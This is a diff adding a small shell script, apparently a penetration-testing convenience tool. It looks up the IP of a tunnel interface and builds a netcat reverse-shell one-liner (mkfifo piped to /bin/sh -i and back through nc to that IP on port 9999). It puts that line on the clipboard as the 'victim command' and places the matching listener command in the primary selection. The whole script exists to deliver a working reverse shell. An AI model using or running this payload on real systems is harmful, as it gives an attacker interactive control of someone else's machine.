@@ -1,0 +1,10 @@
+#!/bin/sh
+
+device=$1
+[ -z $device ] && device=tun0
+
+IP=$(ip addr show $device | grep -E 'inet ' | awk '{split($2, x, "/"); print x[1]}')
+echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 9999 >/tmp/f" | xclip -selection clipboard
+echo -n "nc -lvnp 9999" | xclip -selection primary
+notify-send "Reverse Shell" "Victim command on clipboard\nAttacker command copied to primary"
+
